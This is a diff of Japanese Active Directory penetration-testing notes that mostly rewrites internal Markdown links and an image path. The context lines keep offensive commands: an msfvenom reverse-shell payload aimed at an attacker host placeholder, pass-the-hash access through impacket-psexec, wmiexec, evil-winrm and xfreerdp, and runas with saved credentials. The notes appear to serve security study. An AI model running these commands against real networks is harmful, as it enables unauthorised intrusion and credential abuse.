@@ -105,8 +105,8 @@ $session = New-CimSession -ComputerName <TargetIP> -Credential $credential -Sess
 #### WMIを使用した横展開・永続化の手法比較表
 
 - 用途に応じて使い分ける
-	- 単発的な横展開では、[💥Lateral Movement & Persistance in AD](💥Lateral%20Movement%20&%20Persistance%20in%20AD.md#(a)コマンド（リバースシェル）の実行)を使う
-	- 永続化では[💥Lateral Movement & Persistance in AD](💥Lateral%20Movement%20&%20Persistance%20in%20AD.md#(b)%20悪意あるスケジュールタスクの作成)を使う
+	- 単発的な横展開では、[💥Lateral Movement & Persistance in AD](#(a)コマンド（リバースシェル）の実行)を使う
+	- 永続化では[💥Lateral Movement & Persistance in AD](#(b)%20悪意あるスケジュールタスクの作成)を使う
 
 | 項目      | (a)コマンド実行 | (b)タスク | (c)サービス |
 | ------- | --------- | ------ | ------- |
@@ -229,7 +229,7 @@ msfvenom -p windows/shell_reverse_tcp -f exe-service LHOST=<AttackerIP> LPORT=<P
 	[ファイル操作、ユーティリティ](../../Common/ファイル操作、ユーティリティ.md#Linux%20→%20Windows%20w/%20SMB)（windows側でフォルダ用意不要）
 
 3. 足場マシン上でサービス作成と実行
-	[💥Lateral Movement & Persistance in AD](💥Lateral%20Movement%20&%20Persistance%20in%20AD.md#パターン1%20ユーザー追加（RDP用足場作成）)の`PathName`を`C:\Windows\myservice.exe`に変更し、「サービスの実行」
+	[💥Lateral Movement & Persistance in AD](#パターン1%20ユーザー追加（RDP用足場作成）)の`PathName`を`C:\Windows\myservice.exe`に変更し、「サービスの実行」
 
 ---
 
@@ -296,7 +296,7 @@ xfreerdp3 /d:<domain> /v:$TargetIP /u:<username> /pth:<NThash> /cert:ignore /dyn
 ```
 
 (b)PsExecの実行条件が整っている場合
-	[💥Lateral Movement & Persistance in AD](💥Lateral%20Movement%20&%20Persistance%20in%20AD.md#PsExec使用条件)（リモートからはSMB445ポートがopenであることを確認）
+	[💥Lateral Movement & Persistance in AD](#PsExec使用条件)（リモートからはSMB445ポートがopenであることを確認）
 ```zsh
 # LMHashは空白にして:だけNThashの前に追加
 impacket-psexec -hashes :<NThash> <Username>@<TargetIP>
@@ -304,14 +304,14 @@ impacket-psexec -hashes :<NThash> <Username>@<TargetIP>
 - 認証情報にかかわらず、SYSTMEとしてシェルを確立
 
 (c)WMIの実行条件が整っている場合
-	[💥Lateral Movement & Persistance in AD](💥Lateral%20Movement%20&%20Persistance%20in%20AD.md#WMI使用条件)
+	[💥Lateral Movement & Persistance in AD](#WMI使用条件)
 ```zsh
 # LMHashは空白にして:だけNThashの前に追加
 impacket-wmiexec -hashes :<NThash> <Username>@<TargetIP>
 ```
 
 (d)WinRMの実行条件が整っている場合
-	[💥Lateral Movement & Persistance in AD](💥Lateral%20Movement%20&%20Persistance%20in%20AD.md#WinRM使用条件)
+	[💥Lateral Movement & Persistance in AD](#WinRM使用条件)
 ```zsh
 evil-winrm -i <TargetIP> -u '[domain\]<username>' -H '<NThash>'
 ```
@@ -481,7 +481,7 @@ tscon <セッションID> /dest:[現在のセッション名]
 
 - 条件
 	- 完全にインタラクティブなシェル（RDP等）にアクセス可能なとき
-		- 非インタラクティブシェルでは、パスワードプロンプトが入力を受け付けないので、[💥Lateral Movement & Persistance in AD](💥Lateral%20Movement%20&%20Persistance%20in%20AD.md#RunasCs)等を使う
+		- 非インタラクティブシェルでは、パスワードプロンプトが入力を受け付けないので、[💥Lateral Movement & Persistance in AD](#RunasCs)等を使う
 
 基本コマンド
 ```cmd
@@ -494,7 +494,7 @@ runas /savecred /env /profile /user:<username> cmd.exe
 	- リモートPCのユーザーアカウント：`[NetBIOSコンピュータ名]\<username>`
 	- ADユーザー：`[NetBIOSドメイン名]\<username>` or `<username>@[FQDN]`
 - `/env`：現在の環境変数を保持して新しいユーザーで実行（プロンプトも現在のユーザーのものが引き継がれる）
-![[Pasted image 20250729080025.png]]
+![](../../../画像ファイル/Pasted%20image%2020250729080025.png)
 $$/envを使った場合$$
 
 ### RunasCs
